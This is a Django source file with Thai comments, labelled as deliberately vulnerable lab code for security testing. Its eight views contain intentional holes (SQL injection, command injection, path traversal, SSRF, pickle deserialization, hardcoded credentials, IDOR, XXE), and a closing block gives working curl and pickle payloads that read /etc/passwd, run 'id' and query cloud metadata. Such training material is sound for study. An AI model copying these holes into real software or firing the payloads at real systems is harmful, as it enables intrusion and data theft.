"""
=============================================================
  VULNERABLE CODE — FOR SECURITY TESTING / LAB USE ONLY
  DO NOT DEPLOY TO PRODUCTION
=============================================================

ช่องโหว่ที่รวมอยู่ในไฟล์นี้:
  1. SQL Injection (CWE-89)                — HIGH
  2. OS Command Injection (CWE-78)         — HIGH / CRITICAL
  3. Path Traversal (CWE-22)              — HIGH
  4. SSRF (CWE-918)                       — HIGH
  5. Insecure Deserialization (CWE-502)   — HIGH / CRITICAL
  6. Hardcoded Credentials (CWE-798)      — HIGH
  7. IDOR (CWE-284)                       — HIGH
  8. XXE Injection (CWE-611)              — HIGH
"""

import os
import sqlite3
import subprocess
import pickle
import base64
import xml.etree.ElementTree as ET

import requests
import urllib3
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.db import connection


urllib3.disable_warnings()

# ============================================================
# 1. SQL INJECTION  (CWE-89)
# ============================================================
# URL: /lab/sqli?username=admin'--
@csrf_exempt
def sqli_login(request):
    username = request.GET.get("username", "")
    password = request.GET.get("password", "")

    # VULN: ต่อ string ตรง ๆ เข้า query โดยไม่ parameterize
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

    with connection.cursor() as cursor:
        cursor.execute(query)           # <-- SQL Injection
        row = cursor.fetchone()

    if row:
        return HttpResponse(f"Welcome {username}!")
    return HttpResponse("Login failed", status=401)


# ============================================================
# 2. OS COMMAND INJECTION  (CWE-78)
# ============================================================
# URL: /lab/cmd?host=127.0.0.1;cat /etc/passwd
@csrf_exempt
def cmd_injection(request):
    host = request.GET.get("host", "127.0.0.1")

    # VULN: ส่ง user input เข้า shell=True โดยตรง
    result = subprocess.check_output(f"ping -c 1 {host}", shell=True)  # <-- Command Injection

    return HttpResponse(f"<pre>{result.decode()}</pre>")


# ============================================================
# 3. PATH TRAVERSAL  (CWE-22)
# ============================================================
# URL: /lab/file?name=../../etc/passwd
@csrf_exempt
def path_traversal(request):
    filename = request.GET.get("name", "readme.txt")
    base_dir = "/var/app/uploads/"

    # VULN: ไม่ normalize path ก่อนเปิดไฟล์
    file_path = base_dir + filename    # <-- Path Traversal

    try:
        with open(file_path, "r") as f:
            content = f.read()
        return HttpResponse(f"<pre>{content}</pre>")
    except FileNotFoundError:
        return HttpResponse("File not found", status=404)


# ============================================================
# 4. SSRF — Server-Side Request Forgery  (CWE-918)
# ============================================================
# URL: /lab/ssrf?url=http://169.254.169.254/latest/meta-data/
@csrf_exempt
def ssrf(request):
    target_url = request.GET.get("url", "")

    # VULN: ไม่ validate / allowlist URL ก่อนเรียก
    resp = requests.get(target_url, timeout=5, verify=False)   # <-- SSRF

    return HttpResponse(resp.text, content_type="text/plain")


# ============================================================
# 5. INSECURE DESERIALIZATION  (CWE-502)
# ============================================================
# POST /lab/deserialize   body: {"data": "<base64 pickle>"}
@csrf_exempt
def insecure_deserialize(request):
    if request.method == "POST":
        raw = request.POST.get("data", "")

        # VULN: pickle.loads กับ untrusted data สามารถ execute arbitrary code ได้
        obj = pickle.loads(base64.b64decode(raw))   # <-- Insecure Deserialization

        return JsonResponse({"result": str(obj)})
    return HttpResponse("POST only", status=405)


# ============================================================
# 6. HARDCODED CREDENTIALS  (CWE-798)
# ============================================================
DB_PASSWORD  = "P@ssw0rd123!"          # <-- Hardcoded credential
API_SECRET   = "sk-prod-1234567890ab"  # <-- Hardcoded API key
ADMIN_TOKEN  = "admin:admin"           # <-- Hardcoded token

def admin_panel(request):
    token = request.headers.get("Authorization", "")

    # VULN: เปรียบเทียบกับ hardcoded credential
    if token != ADMIN_TOKEN:
        return HttpResponse("Forbidden", status=403)

    return HttpResponse("Welcome to admin panel!")


# ============================================================
# 7. IDOR — Insecure Direct Object Reference  (CWE-284)
# ============================================================
# URL: /lab/profile?user_id=2  (เปลี่ยนเลขเพื่อดูข้อมูลคนอื่น)
@csrf_exempt
def idor_profile(request):
    user_id = request.GET.get("user_id", "")

    # VULN: ไม่ตรวจว่า user ที่ login มีสิทธิ์ดู user_id นั้นหรือไม่
    query = "SELECT id, username, email, ssn FROM users WHERE id = %s"

    with connection.cursor() as cursor:
        cursor.execute(query, [user_id])    # <-- IDOR (no authorization check)
        row = cursor.fetchone()

    if row:
        return JsonResponse({"id": row[0], "username": row[1], "email": row[2], "ssn": row[3]})
    return HttpResponse("Not found", status=404)


# ============================================================
# 8. XXE — XML External Entity  (CWE-611)
# ============================================================
# POST /lab/xxe   body (XML): <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
@csrf_exempt
def xxe_injection(request):
    if request.method == "POST":
        xml_data = request.body

        # VULN: parse XML โดยไม่ disable external entities
        tree = ET.fromstring(xml_data)      # <-- XXE (stdlib ET ปลอดภัย แต่ lxml ที่ไม่ config จะโดน)

        return HttpResponse(ET.tostring(tree, encoding="unicode"))
    return HttpResponse("POST only", status=405)


# ============================================================
# ตัวอย่าง payload สำหรับทดสอบ (ใช้ใน curl / Burp Suite)
# ============================================================
"""
--- 1. SQL Injection ---
curl "http://localhost:8000/lab/sqli?username=admin'--&password=anything"

--- 2. Command Injection ---
curl "http://localhost:8000/lab/cmd?host=127.0.0.1;id"

--- 3. Path Traversal ---
curl "http://localhost:8000/lab/file?name=../../etc/passwd"

--- 4. SSRF (AWS metadata) ---
curl "http://localhost:8000/lab/ssrf?url=http://169.254.169.254/latest/meta-data/"

--- 5. Insecure Deserialization ---
python3 -c "
import pickle, base64, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"
# นำ output ไปใส่ใน POST data:
curl -X POST http://localhost:8000/lab/deserialize -d "data=<base64_output>"

--- 7. IDOR ---
curl "http://localhost:8000/lab/profile?user_id=1"
curl "http://localhost:8000/lab/profile?user_id=2"

--- 8. XXE (ต้องใช้ lxml parser) ---
curl -X POST http://localhost:8000/lab/xxe \\
  -H "Content-Type: application/xml" \\
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]><root>&f;</root>'
"""
